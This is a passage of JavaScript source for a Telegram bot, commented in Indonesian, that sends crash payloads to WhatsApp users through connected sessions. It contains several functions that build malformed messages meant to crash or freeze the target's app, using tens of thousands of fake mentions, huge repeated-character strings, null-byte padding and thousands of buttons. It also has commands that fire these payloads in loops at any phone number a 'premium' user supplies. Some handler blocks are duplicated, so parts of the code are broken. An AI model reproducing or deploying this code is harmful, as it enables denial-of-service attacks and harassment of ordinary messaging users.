          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await taka.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function RansSuperDelay(taka, target, mention = false) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "RansTech Crash" + "ោ៝".repeat(10000),
        title: "ranstech mode terbang",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://youtube.com/@zahranDev",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "R A N S C R A S H E R ! ! !",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "RansCloudsBug"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await taka.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await taka.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}


async function RansDelayAttack(taka, target, mention = false) {
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: "Jangan Berisik...",
                    height: 999999,
                    width: 999999,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "attack",
                                    songId: "crash",
                                    author: "Xandros Eternal" + "ꦽ".repeat(9000),
                                    title: "XandrosCrash",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: null
                        }
                    ]
                }
            }
        }
    }, {});

    await taka.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await taka.relayMessage(target, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: msg.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
        });
    }
}

async function newspamfc(taka, target) {
for (let r = 0; r < 10; r++) {
const cards = [];
let msg = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "Rans ada disini untukmu",
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "{".repeat(10000),
                                buttons: [{
                                        name: "cta_url",
                                        buttonParamsJson: "{".repeat(100)
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "{".repeat(100)
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});
            
let etc = generateWAMessageFromContent(
    target,
    {
        viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
            title: "",
            hasMediaAttachment: false
            },
            body: {
            text: "Rans ada disini untukmu",
            },
            nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000),
            buttons: [{
            name: "cta_url",
            buttonParamsJson: "{".repeat(100)
            },
            {
            name: "call_permission_request",
            buttonParamsJson: "{".repeat(100)
            },
            {
            name: "call_permission_request",
            buttonParamsJson: "{".repeat(100)
            },
            {
            name: "call_permission_request",
            buttonParamsJson: "{".repeat(100)
            },
            {
            name: "call_permission_request",
            buttonParamsJson: "{".repeat(100)
            }
            ]
            }, 
            carouselMessage: {
              cards,
              messageVersion: 1
            },
            contextInfo: {
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550202@s.whatsapp.net"
              },
              stanzaId: "888-782784-rans" + "-Id" + Math.floor(Math.random() * 99999), // trigger
              forwardingScore: 100,
              isForwarded: true,
              mentionedJid: ["13135550202@s.whatsapp.net"], // trigger
              externalAdReply: {
                title: "SentExoToSystem",
                body: "",
                thumbnailUrl: "https://Ranstech.example.com/",
                mediaType: 1,
                mediaUrl: "",
                sourceUrl: "https://ZvX-rans.example.com",
                showAdAttribution: false
              }
            }
          }
        }
      }
    }, 
    {}
  );

  await taka.relayMessage(target, etc.message, {
        messageId: null,
        participant: {
            jid: target
        },
    });
            await taka.relayMessage(target, msg.message, {
    participant: {
     jid: target
    },
    });
    }
            console.log(chalk.green("Crash Flood By Ranstech"));
        }
        
       async function ComboCrashKipopBlack(taka, target, mode = "kipop", mention = false) {
  if (mode === "black") {
    const msg = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            messageSecret: crypto.randomBytes(32)
          },
          interactiveResponseMessage: {
            body: {
              text: "K͓̽I͓̽P͓̽O͓̽P͓̽ S͓̽O͓̽L̽O͓̽ E͓̽R͓̽A͓̽",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "Black Owl Bot",
              paramsJson: "\u0000".repeat(999999),
              version: 3
            },
            contextInfo: {
              isForwarded: true,
              forwardingScore: 9741,
              forwardedNewsletterMessageInfo: {
                newsletterName: "( @KipopLecy )",
                newsletterJid: "120363321780343299@newsletter",
                serverMessageId: 1
              }
            }
          }
        }
      }
    }, {});

    await taka.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta", attrs: {}, content: [
          { tag: "mentioned_users", attrs: {}, content: [
            { tag: "to", attrs: { jid: target }, content: undefined }
          ]}
        ]
      }]
    });

    if (mention) {
      await taka.relayMessage(target, {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              type: 25
            },
            additionalNodes: [{
              tag: "meta",
              attrs: { is_status_mention: "BlackOwlBOT" },
              content: undefined
            }]
          }
        }
      }, {});
    }

    console.log("✅ Black Owl Crash sent.");
  }

  else if (mode === "kipop") {
    const KlearApi1 = JSON.stringify({
      status: true,
      criador: "Kipop",
      resultado: {
        type: "md",
        ws: {
          _events: { "CB:ib,,dirty": ["Array"] },
          _eventsCount: 800000,
          _maxListeners: 0,
          url: "wss://web.whatsapp.com/ws/chat",
          config: {
            version: ["Array"],
            browser: ["Array"],
            waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
            sockCectTimeoutMs: 20000,
            keepAliveIntervalMs: 30000,
            logger: {},
            printQRInTerminal: false,
            emitOwnEvents: true,
            defaultQueryTimeoutMs: 60000,
            customUploadHosts: [],
            retryRequestDelayMs: 250,
            maxMsgRetryCount: 5,
            fireInitQueries: true,
            auth: { Object: "authData" },
            markOnlineOnsockCect: true,
            syncFullHistory: true,
            linkPreviewImageThumbnailWidth: 192,
            transactionOpts: { Object: "transactionOptsData" },
            generateHighQualityLinkPreview: false,
            options: {},
            appStateMacVerification: { Object: "appStateMacData" },
            mobile: true
          }
        }
      }
    });

    const KlearApi2 = JSON.stringify({
      status: true,
      criador: "Kipop",
      versao: "@latest",
      atualizado: "9999-99-99",
      suporte: "https://wa.me/status?text=" + "ោ៝".repeat(999999),
      comandosDisponiveis: ["crash"],
      prefixo: ".",
      linguagem: "USA"
    }) + "\u0000".repeat(10000);

    const msg = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            nativeFlowMessage: {
              buttons: [
                {
                  name: "call_permission_request",
                  buttonParamsJson: KlearApi1 + "🌹-Kipop Crash-🌹"
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: KlearApi2
                }
              ]
            }
          },
          quotedMessage: {
            ephemeralMessage: {
              message: {
                viewOnceMessage: {
                  message: {
                    ephemeralSettingRequestMessage: { ephemeralDuration: 0 },
                    orderMessage: {
                      itemCount: 99999999,
                      status: 1,
                      message: "🌹-Kipop Crash-🌹",
                      orderTitle: "\n".repeat(20000),
                      sellerJid: "0@s.whatsapp.net"
                    },
                    senderKeyDistributionMessage: {
                      groupId: "19900990099@temp",
                      axolotlSenderKeyDistributionMessage: Buffer.from("00", "hex")
                    }
                  }
                }
              }
            }
          }
        }
      }
    }, {});

    await taka.relayMessage(target, msg.message, {
      messageId: msg.key.id,
      participant: { jid: target }
    });

    await taka.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta", attrs: {}, content: [
          { tag: "mentioned_users", attrs: {}, content: [
            { tag: "to", attrs: { jid: target }, content: undefined }
          ]}
        ]
      }]
    });

    console.log("✅ Kipop Crash sent.");
  }

  else {
    console.log("❌ Mode not recognized. Use 'black' or 'kipop'.");
  }
}
async function DawGy(zэгфs, ё) {
  try {
    let й = [];

    й.push({
      name: "single_select",
      buttonParamsJson: JSON.stringify({ status: true }),
    });

    for (let iю = 0; iю < 20000; iю++) {
      й.push({
        name: "address_message",
        buttonParamsJson: JSON.stringify({ status: true }),
      });
    }

    const ф = await zэгфs.relayMessage(ё, {
      albumMessage: {
        expectedImageCount: -99999999,
        expectedVideoCount: 99999999,
        caption: "zэгфs !иvдsiфй",
      }
    }, {});

    const у = {
      remoteJid: ё,
      fromMe: true,
      id: ф.key.id,
    };
    
    let зх = "image/jpeg";

    let жук = {
      url: "https://mmg.whatsapp.net/v/t62.7118-24/11890058_680423771528047_8816685531428927749_n.enc?ccb=11-4&oh=01_Q5Aa1gEOSJuDSjQ8aFnCByBRmpMc4cTiRpFWn6Af7CA4GymkHg&oe=686B0E3F&_nc_sid=5e03e0&mms3=true",
      mimetype: зх,
      fileSha256: "hCWVPwWmbHO4VlRlOOkk5zhGRI8a6O2XNNEAxrFnpjY=",
      fileLength: "164089",
      height: 9999,
      width: 9999,
      mediaKey: "2zZ0K/gxShTu5iRuTV4j87U8gAjvaRdJY/SQ7AS1lPg=",
      fileEncSha256: "ar7dJHDreOoUA88duATMAk/VZaZaMDKGGS6VMlTyOjA=",
      directPath: "/v/t62.7118-24/11890058_680423771528047_8816685531428927749_n.enc?ccb=11-4&oh=01_Q5Aa1gEOSJuDSjQ8aFnCByBRmpMc4cTiRpFWn6Af7CA4GymkHg&oe=686B0E3F&_nc_sid=5e03e0",
    };

    for (let ц = 0; ц < 15; ц++) {
      const ж = await generateWAMessageFromContent(ё, {
        botInvokeMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
              supportPayload: JSON.stringify({
                version: 2,
                is_ai_message: true,
                should_show_system_message: true,
                ticket_id: crypto.randomBytes(16).toString('hex'),
              }),
              messageSecret: crypto.randomBytes(32),
              messageAssociation: {
                associationType: "MEDIA_ALBUM",
                parentMessageKey: у,
              },
            },
            imageMessage: жук,
          },
        },
      }, {});

      const г = await zэгфs.relayMessage(ё, ж.message, {
        messageId: ж.key.id,
      });

      const щ = г.key.id;

      ж.message.botInvokeMessage.message.caption = "ꦾ".repeat(100000);

      await zэгфs.relayMessage(ё, {
        protocolMessage: {
          type: "MESSAGE_EDIT",
          key: {
            fromMe: true,
            remoteJid: ё,
            id: щ,
          },
          editedMessage: {
            imageMessage: жук,
          },
        },
      }, {});

      const к = await zэгфs.relayMessage(ё, {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              nativeFlowMessage: {
                buttons: й,
                messageParamsJson: "{{".repeat(10000),
              }
            }
          }
        }
      }, {});

      await zэгфs.sendMessage(ё, {
        delete: {
          fromMe: true,
          remoteJid: ё,
          id: щ
        }
      });

      await zэгфs.sendMessage(ё, {
        delete: {
          fromMe: true,
          remoteJid: ё,
          id: к.key.id
        }
      });

  await new Promise(жзг => setTimeout(жзг, 400));
    }

    console.log(`Chat freeze success => ${ё}`);

  } catch (err) {
    console.error("Chat freeze failed:", err);
  }
}

// ENDS FUNC BUG 

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

function isPremium(userId) {
  try {
    const premiumUsers = loadPremiumUsers();
    return premiumUsers.includes(userId.toString());
  } catch (error) {
    console.error("Error checking premium status:", error);
    return false;
  }
}

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, `Hi I Am v-taka crash Bug bot How to use?
  use the /menu command to bring up the menu`);  
});

bot.onText(/\/cekid/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const senderName = msg.from.username ? `User: @${msg.from.username}` : `User ID: ${senderId}`;
  bot.sendMessage(chatId, ` 
┏───────────────────────┓
│ Nᴀᴍᴇ : ${senderName}
│ ID usᴇʀ : ${senderId}
┗───────────────────────┛`);
});

bot.on("message", (msg) => {
  const chatId = msg.chat.id;
});
        
bot.onText(/\/addbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

// CEK ADA BERAPA SENDER
bot.onText(/\/listbot/, async (msg) => {
  const chatId = msg.chat.id;

  // Cek apakah user adalah owner
  if (
    !isOwner(msg.from.id) 
  ) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "HTML" }
    );
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung."
      );
    }

    let botList = "";
    let index = 1;
    for (const botNumber of sessions.keys()) {
      botList += `${index}. ${botNumber}\n`;
      index++;
    }

    bot.sendMessage(
      chatId,
      `*Daftar Bot WhatsApp yang Terhubung:*\n${botList}`,
      { parse_mode: "HTML" }
    );
  } catch (error) {
    console.error("Error in listbot:", error);
    bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menampilkan daftar bot. Silakan coba lagi."
    );
  }
});

// COMMAND BUG \\
bot.onText(/\/CrashFaridz(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const totalbot = sessions.size;
  if (!isOwner(msg.from.id) && !isPremium(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ akses Ditolak\nAnda bukan premium user.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      `
╭━━━⭓「 𝐂𝐀𝐑𝐀 𝐏𝐄𝐍𝐆𝐆𝐔𝐍𝐀𝐀𝐍  」
║ ◇ Format : /CrashFaridz <nomor>
┃ ◇ Contoh: /CrashFaridz 628123456789
║ ◇ Note : jeda 5-10 menit
╰━━━━━━━━━━━━━━━━━━━━━━━━⭓`,
      { parse_mode: "Markdown" }
    );
  }

  const jid = match[1];
  const formattedNumber = jid.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}`+"@s.whatsapp.net";

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }
    
    
    let successCount = 0;
    let failCount = 0;
    const taka = sessions.values().next().value;
    bot.sendPhoto(chatId, "https://files.catbox.moe/8r1666.jpeg", {
    caption: `
╭━━━⭓「 𝐀𝐓𝐓𝐀𝐂𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒  」
║ ◇ 𝐓𝐘𝐏𝐄 : CrashFaridz
┃ ◇ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${formattedNumber}
┃ ◇ 𝐓𝐎𝐓𝐀𝐋 = ${totalbot}
║ ◇ no spam jeda 5-10 menit
╰━━━━━━━━━━━━━━━━━━━━━━━⭓`,
    parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ 
            text: "「 𝘾𝙝𝙚𝙘𝙠 𝙏𝙖𝙧𝙜𝙚𝙩 」",
            url: `https://wa.me/${formattedNumber}`
          }],
        ],
      },
    })
    
    
    let successCount = 0;
    let failCount = 0;
    const taka = sessions.values().next().value;
    bot.sendPhoto(chatId, "https://files.catbox.moe/8r1666.jpeg", {
    caption: `
╭━━━⭓「 𝐀𝐓𝐓𝐀𝐂𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒  」
║ ◇ 𝐓𝐘𝐏𝐄 : CrashFaridz
┃ ◇ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${formattedNumber}
┃ ◇ 𝐓𝐎𝐓𝐀𝐋 = ${totalbot}
║ ◇ no spam jeda 5-10 menit
╰━━━━━━━━━━━━━━━━━━━━━━━⭓`,
    parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ 
            text: "「 𝘾𝙝𝙚𝙘𝙠 𝙏𝙖𝙧𝙜𝙚𝙩 」",
            url: `https://wa.me/${formattedNumber}`
          }],
        ],
      },
    })

    //PEMANGGILAN FUNC
   for (let i = 0; i < 15; i++) {
      await CrashFaridz(taka, target)
      await CrashFaridz(taka, target)
      await CrashFaridz(taka, target)
      await CrashFaridz(taka, target)
    }

  } catch (error) {
    console.error("Error in CrashFaridz:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengirim bug. Silakan coba lagi."
    );
  }
});

bot.onText(/\/CrashIos(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const totalbot = sessions.size;
  if (!isOwner(msg.from.id) && !isPremium(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ akses Ditolak\nAnda bukan premium user.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      `
╭━━━⭓「 𝐂𝐀𝐑𝐀 𝐏𝐄𝐍𝐆𝐆𝐔𝐍𝐀𝐀𝐍  」
║ ◇ Format : /CrashIos <nomor>
┃ ◇ Contoh: /CrashIos 628123456789
║ ◇ Note : jeda 5-10 menit
╰━━━━━━━━━━━━━━━━━━━━━━━━⭓`,
      { parse_mode: "Markdown" }
    );
  }

  const jid = match[1];
  const formattedNumber = jid.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}`+"@s.whatsapp.net";

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }
    
    
    let successCount = 0;
    let failCount = 0;
    const taka = sessions.values().next().value;
    bot.sendPhoto(chatId, "https://files.catbox.moe/8r1666.jpeg", {
    caption: `
╭━━━⭓「 𝐀𝐓𝐓𝐀𝐂𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒  」
║ ◇ 𝐓𝐘𝐏𝐄 : CrashIos
┃ ◇ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${formattedNumber}
┃ ◇ 𝐓𝐎𝐓𝐀𝐋 = ${totalbot}
║ ◇ no spam jeda 5-10 menit
╰━━━━━━━━━━━━━━━━━━━━━━━⭓`,
    parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ 
            text: "「 𝘾𝙝𝙚𝙘𝙠 𝙏𝙖𝙧𝙜𝙚𝙩 」",
            url: `https://wa.me/${formattedNumber}`
          }],
        ],
      },
    })
    
    
    let successCount = 0;
    let failCount = 0;
    const taka = sessions.values().next().value;
    bot.sendPhoto(chatId, "https://files.catbox.moe/8r1666.jpeg", {
    caption: `
╭━━━⭓「 𝐀𝐓𝐓𝐀𝐂𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒  」
║ ◇ 𝐓𝐘𝐏𝐄 : CrashIos
┃ ◇ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${formattedNumber}
┃ ◇ 𝐓𝐎𝐓𝐀𝐋 = ${totalbot}
║ ◇ no spam jeda 5-10 menit
╰━━━━━━━━━━━━━━━━━━━━━━━⭓`,
    parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ 
            text: "「 𝘾𝙝𝙚𝙘𝙠 𝙏𝙖𝙧𝙜𝙚𝙩 」",
            url: `https://wa.me/${formattedNumber}`
          }],
        ],
      },
    })

    //PEMANGGILAN FUNC
   for (let i = 0; i < 15; i++) {
      await CrashIos(taka, target)
      await CrashIos(taka, target)
      await CrashIos(taka, target)
      await CrashIos(taka, target)
    }

  } catch (error) {
    console.error("Error in CrashIos:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengirim bug. Silakan coba lagi."
    );
  }
});

bot.onText(/\/UI-Sistem(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const totalbot = sessions.size;
  if (!isOwner(msg.from.id) && !isPremium(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ akses Ditolak\nAnda bukan premium user.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      `
╭━━━⭓「 𝐂𝐀𝐑𝐀 𝐏𝐄𝐍𝐆𝐆𝐔𝐍𝐀𝐀𝐍  」
║ ◇ Format : /UI-Sistem <nomor>
┃ ◇ Contoh: /UI-Sistem 628123456789
║ ◇ Note : jeda 5-10 menit
╰━━━━━━━━━━━━━━━━━━━━━━━━⭓`,
      { parse_mode: "Markdown" }
    );
  }

  const jid = match[1];
  const formattedNumber = jid.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}`+"@s.whatsapp.net";

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }
    
    
    let successCount = 0;
    let failCount = 0;
    const taka = sessions.values().next().value;
    bot.sendPhoto(chatId, "https://files.catbox.moe/8r1666.jpeg", {
    caption: `
╭━━━⭓「 𝐀𝐓𝐓𝐀𝐂𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒  」
║ ◇ 𝐓𝐘𝐏𝐄 : UI-Sistem
┃ ◇ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${formattedNumber}
┃ ◇ 𝐓𝐎𝐓𝐀𝐋 = ${totalbot}
║ ◇ no spam jeda 5-10 menit
╰━━━━━━━━━━━━━━━━━━━━━━━⭓`,
    parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ 
            text: "「 𝘾𝙝𝙚𝙘𝙠 𝙏𝙖𝙧𝙜𝙚𝙩 」",
            url: `https://wa.me/${formattedNumber}`
          }],
        ],
      },
    })

    //PEMANGGILAN FUNC
    for (let i = 0; i < 15; i++) {
      await OverloadCursor(taka, target)
      await OverloadCursor(taka, target)
      await OverloadCursor(taka, target)
      await OverloadCursor(taka, target)
    }

  } catch (error) {
    console.error("Error in UI-Sistem:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengirim bug. Silakan coba lagi."
